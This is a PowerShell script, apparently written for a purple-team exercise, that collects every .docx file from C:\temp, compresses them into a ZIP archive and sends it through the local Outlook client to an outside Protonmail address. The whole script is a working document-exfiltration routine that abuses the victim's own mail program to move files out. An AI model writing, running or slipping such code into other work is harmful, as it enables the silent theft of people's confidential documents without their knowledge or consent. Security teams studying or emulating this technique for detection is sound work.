# Set the recipient email address
$toAddress = "purpleteaming@protonmail.com"
$subject = "Collected Documents from Temp Folder"
$body = "Attached is the ZIP archive containing all .docx files from the temp folder."

# Get an instance of the Outlook application
try {
    $outlook = New-Object -ComObject Outlook.Application
    Write-Output "Outlook application object created successfully."
} catch {
    Write-Error "Failed to create Outlook application object. $_"
    exit
}

# Collect all .docx files from the temp folder
$tempFolder = "C:\temp"  # Use your specific path or [System.IO.Path]::GetTempPath() for system temp folder
try {
    $docxFiles = Get-ChildItem -Path $tempFolder -Filter *.docx
    if ($docxFiles.Count -eq 0) {
        Write-Warning "No .docx files found in the temp folder."
        exit
    } else {
        Write-Output "$($docxFiles.Count) .docx files found in the temp folder."
    }
} catch {
    Write-Error "Failed to collect .docx files from the temp folder. $_"
    exit
}

# Create a temporary folder for storing individual .docx files
$tempDocxFolder = Join-Path -Path $tempFolder -ChildPath "TempDocx"
New-Item -ItemType Directory -Path $tempDocxFolder -ErrorAction Stop

# Copy .docx files to the temporary folder
foreach ($file in $docxFiles) {
    $destPath = Join-Path -Path $tempDocxFolder -ChildPath $file.Name
    Copy-Item -Path $file.FullName -Destination $destPath -ErrorAction Stop
}

# Create a ZIP archive of the .docx files
$zipFilePath = Join-Path -Path $tempFolder -ChildPath "documents.zip"
try {
    Add-Type -AssemblyName "System.IO.Compression.FileSystem"
    
    # Ensure the ZIP file is not locked by deleting it if it exists
    if (Test-Path $zipFilePath) {
        Remove-Item $zipFilePath -Force
    }
    
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDocxFolder, $zipFilePath)
    Write-Output "ZIP archive created successfully."
} catch {
    Write-Error "Failed to create ZIP archive. $_"
    exit
} finally {
    # Remove temporary folder
    Remove-Item $tempDocxFolder -Recurse -Force
}

# Create a new email to send the ZIP archive
try {
    $mail = $outlook.CreateItem([Microsoft.Office.Interop.Outlook.OlItemType]::olMailItem)
    $mail.To = $toAddress
    $mail.Subject = $subject
    $mail.Body = $body
    $mail.Attachments.Add($zipFilePath)
    Write-Output "New email created and ZIP archive attached successfully."
} catch {
    Write-Error "Failed to create new email or attach ZIP archive. $_"
    exit
}

# Send the email
try {
    $mail.Send()
    Write-Output "Email sent successfully to $toAddress."
} catch {
    Write-Error "Failed to send email. $_"
    exit
}
